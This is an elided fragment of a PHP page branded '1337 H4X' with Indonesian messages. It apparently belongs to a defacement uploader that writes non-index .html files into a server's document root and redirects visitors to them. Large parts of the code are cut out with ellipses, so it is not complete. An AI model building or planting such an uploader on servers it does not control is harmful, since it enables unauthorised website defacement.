...
<body>
	<h3 class="text-center mt-2" style="font-family:'Press Start 2P';">1337 H4X</h3>
	<div class="p-3" id="apps">
		<img src="https://www.seekpng.com/png/detail/69-699283_free-high-quality-hacker-icon-kanal-9-logo.png" width="300" class="mx-auto d-block" style="clip-path: polygon(0 0, 100% 0, 100% 89%, 0 63%);">
				...
				if (is_writable($RootDocument) || is_readable($RootDocument)) {
					if ($FileType === 'html') {
			            ...
			            window.location.href = '$Server/$FileName';
								...
								echo '<script>swal("upload","Silahkan coba lagi.","error")</script>';
							}
						} else {
							echo '<script>swal("upload","File yang diupload tidak boleh index file.","error")</script>';
						}
					} else {
						echo '<script>swal("upload","File yang diupload harus berekstensi .html","error")</script>';
					}
				} else {
					echo '<script>swal("upload","Root document tidak bisa dibaca","error")</script>';
				}
			} else {
